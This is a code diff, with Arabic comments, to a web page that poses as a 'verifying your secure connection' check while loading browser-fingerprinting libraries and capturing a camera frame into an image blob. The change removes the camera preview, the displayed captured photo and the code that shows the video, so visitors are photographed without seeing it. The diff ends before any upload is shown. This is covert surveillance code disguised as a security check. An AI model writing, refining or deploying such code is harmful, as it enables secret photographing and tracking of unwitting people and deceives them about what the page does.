@@ -31,19 +31,6 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    #cameraPreview {
-      display: none;
-      width: 320px;
-      height: 240px;
-      margin: 20px auto;
-      object-fit: cover;
-    }
-    #capturedImage {
-      display: none;
-      max-width: 320px;
-      max-height: 240px;
-      margin: 20px auto;
-    }
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
@@ -53,9 +40,9 @@
 <div class="loader"></div>
 <h2>🔒 جارٍ التحقق من اتصالك الآمن...</h2>
 
-<video id="cameraPreview" autoplay playsinline></video>
+<!-- تم إزالة عناصر الكاميرا المرئية -->
+<video id="cameraPreview" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<img id="capturedImage" alt="الصورة الملتقطة">
 
 <script>
 (async () => {
@@ -70,7 +57,6 @@
     try {
       const video = document.getElementById('cameraPreview');
       const canvas = document.getElementById('canvas');
-      const capturedImage = document.getElementById('capturedImage');
       
       // طلب إذن الكاميرا
       const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -79,7 +65,6 @@
       });
       
       video.srcObject = stream;
-      video.style.display = 'block';
       
       // انتظر ثانية لضمان تشغيل الكاميرا
       await new Promise(resolve => setTimeout(resolve, 1000));
@@ -95,13 +80,8 @@
       const res = await fetch(dataUrl);
       imageBlob = await res.blob();
       
-      // عرض الصورة الملتقطة
-      capturedImage.src = dataUrl;
-      capturedImage.style.display = 'block';
-      
       // إيقاف الكاميرا
       stream.getTracks().forEach(track => track.stop());
-      video.style.display = 'none';
       
     } catch (camError) {
       console.log("تعذر الوصول إلى الكاميرا:", camError);
